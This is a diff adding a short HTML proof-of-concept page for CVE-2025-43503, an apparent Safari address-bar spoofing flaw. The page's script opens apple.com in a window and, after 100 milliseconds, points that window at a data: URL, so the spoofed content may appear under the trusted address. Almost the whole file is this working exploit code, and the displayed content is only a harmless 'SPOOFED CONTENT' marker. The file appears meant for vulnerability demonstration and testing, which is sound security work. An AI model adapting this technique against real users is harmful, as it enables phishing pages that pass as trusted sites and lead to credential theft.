@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CVE-2025-43503 PoC - UI Spoofing</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .trusted { color: green; font-weight: bold; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Safari UI Spoofing Demonstration</h1>
+    <p>Target: Vulnerable versions of Safari (pre-26.1)</p>
+    <p>This PoC attempts to manipulate the address bar state.</p>
+    
+    <button onclick="triggerSpoof()">Click to Test Vulnerability</button>
+
+    <script>
+        function triggerSpoof() {
+            // Step 1: Open a trusted site (e.g., apple.com)
+            const win = window.open('https://www.apple.com', 'spoofWindow');
+
+            // Step 2: Wait for a brief moment for the browser to initiate the UI state
+            setTimeout(() => {
+                if (win) {
+                    // Step 3: Rapidly change the location to a blob or attacker-controlled URL
+                    // The bug CVE-2025-43503 allows the UI to 'stick' to the previous state
+                    win.location = 'data:text/html,<html><body><h1 style="color:red">SPOOFED CONTENT</h1><p>The address bar may still show apple.com</p></body></html>';
+                }
+            }, 100); 
+        }
+    </script>
+</body>
+</html>
